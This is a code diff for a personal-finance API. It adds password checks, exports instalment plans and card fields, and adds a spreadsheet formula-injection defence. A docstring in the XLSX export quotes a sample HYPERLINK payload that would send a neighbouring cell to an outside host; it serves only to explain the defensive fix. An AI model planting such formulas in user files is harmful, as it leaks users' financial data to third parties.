@@ -6,9 +6,10 @@ from fastapi.responses import StreamingResponse
 from sqlalchemy import select
 from sqlalchemy.ext.asyncio import AsyncSession
 
+from app.core.passwords import password_problem
 from app.core.security import get_current_user, verify_password, hash_password
 from app.db.database import get_db
-from app.models.models import User, Account, Transaction, Budget, SavingsGoal, Bill, Category, RecurringIncome
+from app.models.models import User, Account, Transaction, Budget, SavingsGoal, Bill, Category, RecurringIncome, Emi
 from app.services.fx import get_rate, RateUnavailable
 from app.schemas.schemas import (
     UserResponse,
@@ -82,6 +83,13 @@ async def change_password(
             detail="New password must be at least 8 characters long."
         )
 
+    # One definition of "strong enough", shared by registration, reset and
+    # change. Three call sites with three opinions is how an app ends up
+    # refusing a password on one screen and accepting it on another.
+    problem = password_problem(payload.new_password, email=current_user.email, display_name=current_user.display_name)
+    if problem:
+        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=problem)
+
     current_user.password_hash = hash_password(payload.new_password)
     await db.commit()
     return {"message": "Password changed successfully."}
@@ -125,6 +133,7 @@ async def export_data(
     bill_res = await db.execute(select(Bill).where(Bill.user_id == current_user.id))
     cat_res = await db.execute(select(Category).where(Category.user_id == current_user.id))
     inc_res = await db.execute(select(RecurringIncome).where(RecurringIncome.user_id == current_user.id))
+    emi_res = await db.execute(select(Emi).where(Emi.user_id == current_user.id))
 
     return {
         "user": {
@@ -140,7 +149,11 @@ async def export_data(
                 "name": a.name,
                 "type": a.account_type,
                 "opening_balance_minor": a.opening_balance_minor,
-                "currency": a.currency
+                "currency": a.currency,
+                # What makes the account a card. Null on everything else.
+                "statement_day": a.statement_day,
+                "due_day": a.due_day,
+                "credit_limit_minor": a.credit_limit_minor,
             }
             for a in acc_res.scalars().all()
         ],
@@ -173,7 +186,22 @@ async def export_data(
         "recurring_incomes": [
             {"id": str(r.id), "source": r.source, "amount_minor": r.amount_minor, "frequency": r.frequency}
             for r in inc_res.scalars().all()
-        ]
+        ],
+        # Entered by hand and derived from nothing else here, so this is the
+        # one table an export cannot reconstruct from the rest of itself.
+        "emis": [
+            {
+                "id": str(e.id),
+                "name": e.name,
+                "monthly_minor": e.monthly_minor,
+                "months": e.months,
+                "started_at": e.started_at.isoformat() if e.started_at else None,
+                "account_id": str(e.account_id) if e.account_id else None,
+                "currency": e.currency,
+                "is_active": e.is_active,
+            }
+            for e in emi_res.scalars().all()
+        ],
     }
 
 
@@ -267,6 +295,7 @@ async def export_data_xlsx(
     bill_res = await db.execute(select(Bill).where(Bill.user_id == current_user.id))
     cat_res = await db.execute(select(Category).where(Category.user_id == current_user.id))
     inc_res = await db.execute(select(RecurringIncome).where(RecurringIncome.user_id == current_user.id))
+    emi_res = await db.execute(select(Emi).where(Emi.user_id == current_user.id))
 
     accounts = list(acc_res.scalars().all())
     transactions = list(tx_res.scalars().all())
@@ -275,6 +304,7 @@ async def export_data_xlsx(
     bills = list(bill_res.scalars().all())
     categories = list(cat_res.scalars().all())
     incomes = list(inc_res.scalars().all())
+    emis = list(emi_res.scalars().all())
 
     account_names = {a.id: a.name for a in accounts}
     category_names = {c.id: c.name for c in categories}
@@ -287,7 +317,26 @@ async def export_data_xlsx(
     wb = Workbook()
     wb.remove(wb.active)
 
+    # Characters that make Excel treat a cell as a formula rather than text.
+    # A leading "-" is included because "-1+1" is arithmetic to Excel, and a
+    # tab or carriage return can smuggle one of the others to the front.
+    FORMULA_STARTERS = ("=", "+", "-", "@", "\t", "\r")
+
     def add_sheet(title, headers, rows, money_cols=()):
+        """One sheet, with every text cell forced to stay text.
+
+        A description is user data, and some of it arrives from outside: a
+        bank narration, an imported statement, a payee name off a payment
+        alert. openpyxl stores a string beginning with "=" as a FORMULA -
+        verified, data_type 'f' - so a description of
+        `=HYPERLINK("http://.../?"&A1,"CLICK")` becomes live in the workbook
+        and fires the moment the owner opens their own export, sending the
+        neighbouring cell to whoever wrote it.
+
+        The value is not altered - no apostrophe is prepended, so the export
+        still reads exactly as the ledger does. The cell type is simply
+        pinned to string, which is what it always should have been.
+        """
         ws = wb.create_sheet(title)
         ws.append(headers)
         for cell in ws[1]:
@@ -296,6 +345,9 @@ async def export_data_xlsx(
             cell.alignment = Alignment(vertical="center")
         for row in rows:
             ws.append(row)
+            for cell in ws[ws.max_row]:
+                if isinstance(cell.value, str) and cell.value.startswith(FORMULA_STARTERS):
+                    cell.data_type = "s"
         for idx in money_cols:
             for cell in ws[get_column_letter(idx)][1:]:
                 cell.number_format = money_format
@@ -347,11 +399,18 @@ async def export_data_xlsx(
         ],
         money_cols=(4,))
 
+    # The two billing days come out with the account because they are what
+    # makes it a card: exported without them, a restored account is an
+    # ordinary liability and every due date it carried is gone.
     add_sheet("Accounts",
-        ["Name", "Type", f"Opening balance ({currency})", "Currency", "Active"],
+        ["Name", "Type", f"Opening balance ({currency})", "Currency", "Active",
+         "Statement day", "Payment due day", f"Credit limit ({currency})"],
         [[a.name, a.account_type, rupees(a.opening_balance_minor), a.currency,
-          "Yes" if a.is_active else "No"] for a in accounts],
-        money_cols=(3,))
+          "Yes" if a.is_active else "No",
+          a.statement_day or "", a.due_day or "",
+          rupees(a.credit_limit_minor) if a.credit_limit_minor else ""]
+         for a in accounts],
+        money_cols=(3, 8))
 
     add_sheet("Budgets",
         ["Category", f"Limit ({currency})", "Period", "Start", "End"],
@@ -373,6 +432,20 @@ async def export_data_xlsx(
         ["Source", f"Amount ({currency})", "Frequency", "Next occurrence"],
         [[r.source, rupees(r.amount_minor), r.frequency, when(r.next_occurrence)] for r in incomes],
         money_cols=(2,))
+
+    # Instalment plans are entered by hand and derived from nothing else in
+    # here, so they are the one table an export cannot reconstruct. Left out,
+    # a person who exports everything and starts again has silently lost the
+    # record of what they are still committed to paying.
+    add_sheet("Instalments",
+        ["What is being paid off", f"Instalment ({currency})", "Instalments",
+         "First instalment", f"Total ({currency})", "Charged to", "Status"],
+        [[e.name, rupees(e.monthly_minor), e.months, when(e.started_at),
+          rupees((e.monthly_minor or 0) * (e.months or 0)),
+          account_names.get(e.account_id, "") if e.account_id else "",
+          "Running" if e.is_active else "Closed"]
+         for e in sorted(emis, key=lambda x: x.started_at or datetime.min, reverse=True)],
+        money_cols=(2, 5))
 
     add_sheet("Categories", ["Name", "Type"], [[c.name, c.type] for c in categories])
 
